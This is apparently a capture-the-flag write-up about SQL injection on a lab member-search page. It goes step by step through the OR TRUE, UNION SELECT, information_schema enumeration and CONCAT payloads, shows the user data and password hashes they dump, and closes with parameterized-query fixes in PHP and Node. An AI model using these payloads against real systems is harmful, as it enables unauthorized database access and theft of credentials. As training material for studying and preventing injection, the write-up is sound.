# Sql injection on members table

<!-- We could explain what is an sql injection before all -->

From the page `http://IP/?page=member`, where we can find a members search engine by user ID.

## Legit search

First of all trying searching for a userID of `1` results:

Input:

```sql
1
```

Output:

```txt
ID: 1
First name: one
Surname : me
```

We can see that the server returns two user fields.

## Simple SQL injection attempt

Starting hacking using a really simple sql injection such as:

Input:

```sql
SELECT * FROM users
```

Output:

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT * FROM users' at line 1
```

The server show us the raw MariaDB error, we see that our query has been added to a prebuilt one.
The prebuild query should look like something:

```sql
SELECT first_name, surname FROM users WHERE users.id = ${id} 
```

## Condition injection

To be able to retrieve to whole users table entry we need to create a SQL query that has a WHERE clause always evaluating to `TRUE`. We achieve this result by adding a `OR TRUE` condition.

Input:

```sql
1 OR TRUE
```

Resulting on the server as:

```sql
SELECT first_name, surname FROM users WHERE users.id = 1 OR TRUE
```

Output:

```
ID: 1 OR TRUE 
First name: one
Surname : me

ID: 1 OR TRUE 
First name: two
Surname : me

ID: 1 OR TRUE 
First name: three
Surname : me

ID: 1 OR TRUE 
First name: Flag
Surname : GetThe
```

There are four users in the users table. The last one looks quite suspicious.

## UNION SELECT SQL injection

source: https://www.sqlinjection.net/column-names/

As a first SQL query is build using our input. By using the UNION SELECT attack we could build a new query over the first one.

We want to discard all results of the first SELECT and only keep those of our own SELECT. For that we make sure the WHERE clause of the first SELECT always evalutes to `FALSE`.

Input:

```sql
-1 UNION SELECT * FROM users
```

As a serial integer is never negative, no user can have an id that is `-1`.

Output:
```sql
The used SELECT statements have a different number of columns
```

The problem there is that our second `UNION SELECT` query returns more than the initial sql query, that returned 2 columns, due to selecting all fields with `*`.

## Finding all tables columns name

Our goal is to retrieve all the `users` table columns names to be able to gather them using the `UNION SELECT` injection.
To do so we will be using the default database `information_schema.columns` information.

Input:

```sql
-1 UNION SELECT table_name, column_name FROM information_schema.columns
```

Output:

```
<!-- OTHER DATABASE INFORMATION -->

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : user_id

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : first_name

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : last_name

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : town

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : country

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : planet

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : Commentaire

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : countersign

<!-- OTHER DATABASE INFORMATION -->
```

We have retrieved the whole database tables and columns name, focusing on the users table we can find the following columns name:

- user_id
- first_name
- last_name
- town
- country
- planet
- Commentaire
- countersign

## Using `CONCAT` injection

source: https://makitweb.com/how-to-concatenate-multiple-columns-in-mysql/

What we want now is to retrieve all the users entry columns value within on column, as the initial query returns only 2 columns.

Input:

```sql
-1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users
```

Output:

```sql
ID: -1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: 1onemeParis FranceEARTHJe pense, donc je suis2b3366bcfd44f540e630d4dc2b9b06d9
Surname : 1

ID: -1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: 2twomeHelsinkiFinlandeEarthAamu on iltaa viisaampi.60e9032c586fb422e2c16dee6286cf10
Surname : 1

ID: -1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: 3threemeDublinIrlandeEarthDublin is a city of stories and secrets.e083b24a01c483437bcf4a9eea7c1b4d
Surname : 1

ID: -1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
Surname : 1
```

Inside the last user we can find the operations to do to retrieve the flag.

### Retrieving the flag

Via md5 decrypt of `5ff9d0165b4f92b14994e5c685cdce28` containted in the `countersign` users table column that leads to `FortyTwo`.

Hashing using sha256 the `fortytwo` results in `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## Solution

A solution to avoid this kind of breach would be to escape received id using either your native database escaping tools or manually.

An other solution would be to use an ORM that will natively prevent sql injections.

### Php Example

Unsecured sql querying:

```php
$statement = $dbh->prepare("select first_name, surname from users where users.id = {$id}");
$statement->execute();
```

Secured sql querying:

```php
$statement = $dbh->prepare("select first_name, surname from users where users.id = ?");
$statement->execute([$id]);
```

### Node Example

Unsecured sql querying:

```js
connection.query(
  `select first_name, surname from users where users.id = ${id}`,
  function(err, rows, fields) {
    // Do something with the retrieved data.
  });

```

Secured sql querying:

```js
connection.query(
  'select first_name, surname from users where users.id = ?',
  [id],
  function(err, rows, fields) {
    // Do something with the retrieved data.
  });
```
